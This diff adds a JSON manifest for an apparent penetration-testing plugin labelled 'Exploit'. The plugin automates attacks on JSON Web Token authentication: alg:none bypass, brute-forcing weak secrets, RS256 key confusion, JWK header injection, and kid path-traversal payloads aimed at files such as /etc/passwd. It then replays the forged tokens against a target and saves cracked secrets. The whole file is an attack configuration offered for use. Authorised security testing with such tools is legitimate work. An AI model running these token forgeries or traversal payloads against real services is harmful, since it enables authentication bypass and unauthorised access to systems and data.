@@ -1,0 +1,62 @@
+{
+  "name": "kobra-plugin-jwt-attack",
+  "version": "1.0.0",
+  "author": "shenyo1",
+  "description": "JWT exploitation suite: alg:none, weak secret, RS256 confusion, key confusion. Outputs forged tokens.",
+  "category": "Exploit",
+  "engine_version": ">=4.4.0",
+  "patterns": [
+    {
+      "kind": "trigger",
+      "value": "auth_flow.classified:JWT",
+      "severity_hint": "High"
+    },
+    {
+      "kind": "trigger",
+      "value": "jwt.finding.detected",
+      "severity_hint": "High"
+    }
+  ],
+  "attacks": [
+    {
+      "name": "alg_none_bypass",
+      "description": "Strip signature, change alg to 'none'",
+      "forged_token": "{alg}:{header_b64}.{payload_b64}."
+    },
+    {
+      "name": "weak_secret_bruteforce",
+      "description": "Try common secrets via hashcat-compatible wordlist",
+      "wordlist": "~/.local/share/kobra/wordlists/jwt-secrets.txt",
+      "max_attempts": 100000
+    },
+    {
+      "name": "rs256_confusion",
+      "description": "Use RSA public key as HMAC secret",
+      "prerequisites": ["rsa_public_key_extracted"]
+    },
+    {
+      "name": "jwk_header_injection",
+      "description": "Inject attacker-controlled JWK in header",
+      "generate_keypair": true
+    },
+    {
+      "name": "kid_path_traversal",
+      "description": "kid param with path traversal",
+      "payloads": [
+        "/dev/null",
+        "../../../dev/null",
+        "../../../../etc/passwd",
+        "../../win.ini"
+      ]
+    }
+  ],
+  "post_actions": [
+    "verify_forged_token_against_target",
+    "replay_attack"
+  ],
+  "outputs": {
+    "forged_tokens": "{output_dir}/jwt-attack-tokens.txt",
+    "cracked_secret": "{output_dir}/jwt-secret.txt",
+    "replay_log": "{output_dir}/jwt-replay.log"
+  }
+}
